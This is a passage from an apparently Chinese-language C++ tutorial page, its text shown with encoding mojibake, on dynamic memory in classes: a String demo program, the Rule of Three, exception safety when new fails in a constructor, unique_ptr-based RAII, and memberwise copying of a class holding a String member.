class="built_in">cin</span>.get(temp, MaxLen); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">cin</span> &amp;&amp; <span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// æ¸…é™¤è¡Œå°¾æ¢è¡Œç¬¦</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">cin</span> || temp[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">// æ£€æŸ¥ç©ºè¡Œæˆ–è¾“å…¥é”™è¯¯</span></span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// i æœªå¢åŠ </span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sayings[i] = temp; <span class="comment">// è°ƒç”¨ operator=(const char*)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> total = i; <span class="comment">// è®°å½•å®é™…è¾“å…¥çš„æ•°é‡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Here are your sayings:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; total; i++)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; sayings[i][<span class="number">0</span>] &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; sayings[i] &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ operator[] å’Œ operator&lt;&lt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰¾åˆ°æœ€çŸ­å’Œç¬¬ä¸€ä¸ªå­—æ¯é¡ºåºæœ€å°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">int</span> shortest = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; total; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sayings[i].length() &lt; sayings[shortest].length()) <span class="comment">// ä½¿ç”¨ length()</span></span><br><span class="line">                shortest = i;</span><br><span class="line">            <span class="keyword">if</span> (sayings[i] &lt; sayings[first]) <span class="comment">// ä½¿ç”¨ operator&lt;</span></span><br><span class="line">                first = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Shortest saying:\n&quot;</span> &lt;&lt; sayings[shortest] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First alphabetically:\n&quot;</span> &lt;&lt; sayings[first] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">        String favorite = sayings[shortest];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My favorite saying:\n&quot;</span> &lt;&lt; favorite &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This program used &quot;</span> &lt;&lt; String::HowMany() &lt;&lt; <span class="string">&quot; String objects. Bye.\n&quot;</span>; <span class="comment">// ä½¿ç”¨ HowMany()</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No input! Bye.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºç°åœ¨å¯ä»¥æ­£ç¡®åœ°åˆ›å»ºã€å¤åˆ¶ã€èµ‹å€¼å’Œé”€æ¯ <code>String</code> å¯¹è±¡ï¼Œè€Œä¸ä¼šå‡ºç°å†…å­˜æ³„æ¼æˆ–å´©æºƒï¼Œå› ä¸ºæˆ‘ä»¬æä¾›äº†æ­£ç¡®çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç†åŠ¨æ€å†…å­˜ã€‚</p><h2 id="12-3-åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨-new-æ—¶åº”æ³¨æ„çš„äº‹é¡¹"><a href="#12-3-åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨-new-æ—¶åº”æ³¨æ„çš„äº‹é¡¹" class="headerlink" title="12.3 åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ new æ—¶åº”æ³¨æ„çš„äº‹é¡¹"></a>12.3 åœ¨æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ new æ—¶åº”æ³¨æ„çš„äº‹é¡¹</h2><p>å½“ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨ <code>new</code> æ¥åˆ†é…åŠ¨æ€å†…å­˜æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„å†…å­˜ç®¡ç†å’Œæ½œåœ¨çš„é”™è¯¯æƒ…å†µï¼Œä»¥ç¡®ä¿ç¨‹åºçš„å¥å£®æ€§å’Œé¿å…èµ„æºæ³„æ¼ã€‚</p><h3 id="12-3-1-åº”è¯¥å’Œä¸åº”è¯¥"><a href="#12-3-1-åº”è¯¥å’Œä¸åº”è¯¥" class="headerlink" title="12.3.1 åº”è¯¥å’Œä¸åº”è¯¥"></a>12.3.1 åº”è¯¥å’Œä¸åº”è¯¥</h3><p><strong>åº”è¯¥åšçš„äº‹:</strong></p><ol><li><p><strong>åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ <code>delete</code>:</strong> å¦‚æœæ„é€ å‡½æ•°ä½¿ç”¨ <code>new</code> åˆ†é…äº†å†…å­˜ï¼Œé‚£ä¹ˆå¿…é¡»åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ <code>delete</code>ï¼ˆæˆ– <code>delete[]</code> å¦‚æœåˆ†é…çš„æ˜¯æ•°ç»„ï¼‰æ¥é‡Šæ”¾è¿™äº›å†…å­˜ã€‚è¿™æ˜¯é˜²æ­¢å†…å­˜æ³„æ¼çš„åŸºæœ¬è¦æ±‚ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> * data;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass(<span class="keyword">size_t</span> n) : size(n) &#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[size]; <span class="comment">// åˆ†é…å†…å­˜</span></span><br><span class="line">        <span class="comment">// ... åˆå§‹åŒ– data ...</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyClass constructed, allocated memory.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~MyClass() &#123;</span><br><span class="line">        <span class="keyword">delete</span> [] data; <span class="comment">// *** å¿…é¡»åœ¨ææ„å‡½æ•°ä¸­é‡Šæ”¾å†…å­˜ ***</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MyClass destructed, freed memory.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// *** è¿˜éœ€è¦å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ (Rule of Three/Five) ***</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p> <strong>ä½¿ç”¨ <code>delete[]</code> é‡Šæ”¾æ•°ç»„:</strong> å¦‚æœæ„é€ å‡½æ•°ä½¿ç”¨ <code>new T[size]</code> åˆ†é…äº†æ•°ç»„ï¼Œææ„å‡½æ•°å¿…é¡»ä½¿ç”¨ <code>delete[]</code> æ¥é‡Šæ”¾ã€‚å¦‚æœä½¿ç”¨ <code>new T</code> åˆ†é…å•ä¸ªå¯¹è±¡ï¼Œåˆ™ä½¿ç”¨ <code>delete</code>ã€‚æ··ç”¨ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚</p></li><li><p> <strong>å®ç°æ·±å¤åˆ¶:</strong> å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜ï¼Œå¿…é¡»æä¾›è‡ªå®šä¹‰çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œå¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦æ¥æ‰§è¡Œæ·±å¤åˆ¶ï¼Œä»¥é¿å…æµ…å¤åˆ¶å¸¦æ¥çš„é—®é¢˜ï¼ˆå¦‚é‡å¤åˆ é™¤ã€æ‚¬æŒ‚æŒ‡é’ˆï¼‰ã€‚</p></li></ol><p><strong>ä¸åº”è¯¥åšçš„äº‹ (æˆ–éœ€è¦æ³¨æ„):</strong></p><ol><li><p> <strong>å¿˜è®° <code>delete</code>:</strong> ä¸åœ¨ææ„å‡½æ•°ä¸­é‡Šæ”¾æ„é€ å‡½æ•°åˆ†é…çš„å†…å­˜ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚æ¯æ¬¡å¯¹è±¡é”€æ¯æ—¶ï¼Œå®ƒå ç”¨çš„åŠ¨æ€å†…å­˜éƒ½ä¸ä¼šè¢«å›æ”¶ã€‚</p></li><li><p><strong>æ„é€ å‡½æ•°ä¸­ <code>new</code> å¤±è´¥:</strong> <code>new</code> è¿ç®—ç¬¦åœ¨æ— æ³•åˆ†é…æ‰€éœ€å†…å­˜æ—¶ï¼Œé»˜è®¤ä¼šæŠ›å‡º <code>std::bad_alloc</code> å¼‚å¸¸ã€‚</p><ul><li><p>  å¦‚æœ <code>new</code> æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¹è±¡çš„æ„é€ è¿‡ç¨‹ä¼š<strong>ç«‹å³ç»ˆæ­¢</strong>ã€‚</p></li><li><p>  é‡è¦çš„æ˜¯ï¼Œå¯¹è±¡çš„<strong>ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨</strong>ï¼Œå› ä¸ºå¯¹è±¡ä»æœªè¢«å®Œå…¨æ„é€ ã€‚</p></li><li><p>è¿™æ„å‘³ç€ï¼Œå¦‚æœåœ¨æŠ›å‡ºå¼‚å¸¸çš„ <code>new</code> ä¹‹å‰ï¼Œæ„é€ å‡½æ•°å·²ç»æˆåŠŸåˆ†é…äº†<strong>å…¶ä»–</strong>åŠ¨æ€èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¦ä¸€ä¸ª <code>new</code>ï¼‰ï¼Œé‚£ä¹ˆè¿™äº›èµ„æºå¯èƒ½ä¼šæ³„æ¼ï¼Œå› ä¸ºæ²¡æœ‰ææ„å‡½æ•°æ¥æ¸…ç†å®ƒä»¬ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Problematic</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> * data1;</span><br><span class="line">    <span class="keyword">char</span> * data2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Problematic(<span class="keyword">size_t</span> n1, <span class="keyword">size_t</span> n2) : data1(<span class="literal">nullptr</span>), data2(<span class="literal">nullptr</span>) &#123; <span class="comment">// åˆå§‹åŒ–ä¸º nullptr</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data1 = <span class="keyword">new</span> <span class="keyword">int</span>[n1];</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allocated data1\n&quot;</span>;</span><br><span class="line">            <span class="comment">// *** å¦‚æœä¸‹é¢çš„ new å¤±è´¥ ***</span></span><br><span class="line">            data2 = <span class="keyword">new</span> <span class="keyword">char</span>[n2];</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allocated data2\n&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_alloc &amp; ba) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Memory allocation failed: &quot;</span> &lt;&lt; ba.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// *** ææ„å‡½æ•°ä¸ä¼šè°ƒç”¨ï¼Œéœ€è¦åœ¨è¿™é‡Œæ‰‹åŠ¨æ¸…ç† data1 (å¦‚æœå·²åˆ†é…) ***</span></span><br><span class="line">            <span class="keyword">delete</span> [] data1; <span class="comment">// å¦‚æœ data1 åˆ†é…æˆåŠŸä½† data2 å¤±è´¥ï¼Œéœ€è¦é‡Šæ”¾ data1</span></span><br><span class="line">            data1 = <span class="literal">nullptr</span>; <span class="comment">// é¿å…æ‚¬æŒ‚æŒ‡é’ˆ (è™½ç„¶å¯¹è±¡æ„é€ å¤±è´¥äº†)</span></span><br><span class="line">            <span class="comment">// é‡æ–°æŠ›å‡ºå¼‚å¸¸æˆ–å¤„ç†é”™è¯¯</span></span><br><span class="line">            <span class="keyword">throw</span>; <span class="comment">// é‡æ–°æŠ›å‡ºï¼Œè®©è°ƒç”¨è€…çŸ¥é“æ„é€ å¤±è´¥</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~Problematic() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Problematic destructor called\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span> [] data1;</span><br><span class="line">        <span class="keyword">delete</span> [] data2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ... å¤åˆ¶æ§åˆ¶ ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å°è¯•åˆ†é…éå¸¸å¤§çš„å†…å­˜ï¼Œå¯èƒ½ä¼šå¤±è´¥</span></span><br><span class="line">        <span class="function">Problematic <span class="title">p</span><span class="params">(<span class="number">100</span>, <span class="number">1000000000000U</span>LL)</span></span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to create Problematic object.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>æ›´å¥½çš„æ–¹æ³•:</strong> ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™ï¼Œä¾‹å¦‚ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ <code>std::unique_ptr</code>ï¼‰æ¥ç®¡ç†åŠ¨æ€å†…å­˜ã€‚æ™ºèƒ½æŒ‡é’ˆä¼šåœ¨å…¶è‡ªèº«è¢«é”€æ¯æ—¶è‡ªåŠ¨é‡Šæ”¾æ‰€ç®¡ç†çš„å†…å­˜ï¼Œå³ä½¿å‘ç”Ÿå¼‚å¸¸å¯¼è‡´æ ˆå±•å¼€ï¼Œä¹Ÿèƒ½ä¿è¯èµ„æºè¢«é‡Šæ”¾ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for std::unique_ptr</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BetterClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>[]&gt; data1; <span class="comment">// ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆç®¡ç†æ•°ç»„</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">char</span>[]&gt; data2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BetterClass(<span class="keyword">size_t</span> n1, <span class="keyword">size_t</span> n2)</span><br><span class="line">        : data1(<span class="keyword">new</span> <span class="keyword">int</span>[n1]), data2(<span class="keyword">new</span> <span class="keyword">char</span>[n2]) <span class="comment">// ç›´æ¥åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆ†é…</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BetterClass constructed.\n&quot;</span>;</span><br><span class="line">        <span class="comment">// å¦‚æœ new å¤±è´¥ï¼Œå¼‚å¸¸ä¼šæŠ›å‡ºï¼Œå·²æˆåŠŸæ„é€ çš„ unique_ptr (å¦‚æœæœ‰) ä¼šè‡ªåŠ¨é‡Šæ”¾å†…å­˜</span></span><br><span class="line">        <span class="comment">// ä¸éœ€è¦ try-catch æ¥æ‰‹åŠ¨ delete</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¸éœ€è¦æ˜¾å¼ææ„å‡½æ•°æ¥ delete data1/data2ï¼Œunique_ptr ä¼šè‡ªåŠ¨å¤„ç†</span></span><br><span class="line">    <span class="comment">// ä½†ä»ç„¶éœ€è¦éµå¾ª Rule of Three/Five/Zero (ä½¿ç”¨ unique_ptr é€šå¸¸éµå¾ª Rule of Zero)</span></span><br><span class="line">    ~BetterClass() &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BetterClass destructed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¯èƒ½éœ€è¦è‡ªå®šä¹‰å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼Œæˆ–è€…ç¦ç”¨å®ƒä»¬ï¼Œå› ä¸º unique_ptr é»˜è®¤ä¸å¯å¤åˆ¶</span></span><br><span class="line">    BetterClass(<span class="keyword">const</span> BetterClass&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    BetterClass&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> BetterClass&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="comment">// å¯ä»¥æ·»åŠ ç§»åŠ¨æ“ä½œ</span></span><br><span class="line">    BetterClass(BetterClass&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    BetterClass&amp; <span class="keyword">operator</span>=(BetterClass&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="12-3-2-åŒ…å«ç±»æˆå‘˜çš„ç±»çš„é€æˆå‘˜å¤åˆ¶"><a href="#12-3-2-åŒ…å«ç±»æˆå‘˜çš„ç±»çš„é€æˆå‘˜å¤åˆ¶" class="headerlink" title="12.3.2 åŒ…å«ç±»æˆå‘˜çš„ç±»çš„é€æˆå‘˜å¤åˆ¶"></a>12.3.2 åŒ…å«ç±»æˆå‘˜çš„ç±»çš„é€æˆå‘˜å¤åˆ¶</h3><p>å½“ä¸€ä¸ªç±»ï¼ˆç§°ä¸º<strong>åŒ…å«ç±»</strong>æˆ–<strong>å®¹å™¨ç±»</strong>ï¼‰åŒ…å«å…¶ä»–ç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜æ—¶ï¼Œé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦çš„è¡Œä¸ºä»ç„¶æ˜¯<strong>æˆå‘˜é€ä¸€å¤åˆ¶</strong>ã€‚</p><p>è¿™æ„å‘³ç€å¯¹äºå®¹å™¨ç±»ä¸­çš„<strong>æ¯ä¸ªæˆå‘˜</strong>ï¼š</p><ul><li>  å¦‚æœæ˜¯å†…ç½®ç±»å‹ï¼ˆ<code>int</code>, <code>double</code>, æŒ‡é’ˆç­‰ï¼‰ï¼Œåˆ™æŒ‰å€¼å¤åˆ¶ã€‚</li><li>  å¦‚æœæ˜¯<strong>ç±»å¯¹è±¡</strong>ï¼Œåˆ™è°ƒç”¨è¯¥æˆå‘˜å¯¹è±¡çš„<strong>å¤åˆ¶æ„é€ å‡½æ•°</strong>ï¼ˆå¯¹äºå®¹å™¨çš„å¤åˆ¶æ„é€ ï¼‰æˆ–<strong>èµ‹å€¼è¿ç®—ç¬¦</strong>ï¼ˆå¯¹äºå®¹å™¨çš„èµ‹å€¼è¿ç®—ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>Gadget</code> ç±»ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæˆ‘ä»¬ä¹‹å‰æ”¹è¿›è¿‡çš„ <code>String</code> å¯¹è±¡ï¼ˆæ¥è‡ª <code>string1.h</code>ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gadget.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> GADGET_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GADGET_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// åŒ…å«æ”¹è¿›çš„ String ç±»</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gadget</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    String name; <span class="comment">// æˆå‘˜æ˜¯ String å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Gadget(<span class="keyword">const</span> <span class="keyword">char</span> * s = <span class="string">&quot;Default Gadget&quot;</span>, <span class="keyword">int</span> i = <span class="number">0</span>) : name(s), id(i) &#123;&#125;</span><br><span class="line">    Gadget(<span class="keyword">const</span> String&amp; s, <span class="keyword">int</span> i = <span class="number">0</span>) : name(s), id(i) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** æ²¡æœ‰æ˜¾å¼å®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ ***</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// GADGET_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gadget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Gadget <span class="title">g1</span><span class="params">(<span class="string">&quot;Flux Capacitor&quot;</span>, <span class="number">121</span>)</span></span>;</span><br><span class="line">    g1.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Copying g1 to g2 ---\n&quot;</span>;</span><br><span class="line">    Gadget g2 = g1; <span class="comment">// è°ƒç”¨ Gadget çš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    g2.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Assigning g1 to g3 ---\n&quot;</span>;</span><br><span class="line">    Gadget g3; <span class="comment">// è°ƒç”¨ Gadget é»˜è®¤æ„é€ å‡½æ•° (name ä¼šè°ƒç”¨ String é»˜è®¤æ„é€ å‡½æ•°)</span></span><br><span class="line">    g3.show();</span><br><span class="line">    g3 = g1; <span class="comment">// è°ƒç”¨ Gadget çš„é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    g3.show();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of main ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// g1, g2, g3 çš„ææ„å‡½æ•°è¢«è°ƒç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</strong></p><ol><li><p><strong><code>Gadget g2 = g1;</code> (é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°):</strong></p><ul><li>  ç¼–è¯‘å™¨ç”Ÿæˆçš„ <code>Gadget</code> å¤åˆ¶æ„é€ å‡½æ•°ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€å¤åˆ¶ã€‚</li><li>  å¯¹äº <code>int id</code> æˆå‘˜ï¼š<code>g2.id</code> è¢«è®¾ç½®ä¸º <code>g1.id</code> çš„å€¼ (121)ã€‚</li><li>  å¯¹äº <code>String name</code> æˆå‘˜ï¼šè°ƒç”¨ <code>String</code> ç±»çš„<strong>å¤åˆ¶æ„é€ å‡½æ•°</strong> <code>String(const String&amp;)</code> æ¥åˆå§‹åŒ– <code>g2.name</code>ï¼Œä½¿ç”¨ <code>g1.name</code> ä½œä¸ºæºã€‚å› ä¸ºæˆ‘ä»¬çš„ <code>String</code> ç±»æœ‰æ­£ç¡®çš„æ·±å¤åˆ¶æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥ <code>g2.name</code> ä¼šè·å¾— <code>g1.name</code> å†…å®¹çš„ç‹¬ç«‹å‰¯æœ¬ã€‚</li></ul></li><li><p><strong><code>g3 = g1;</code> 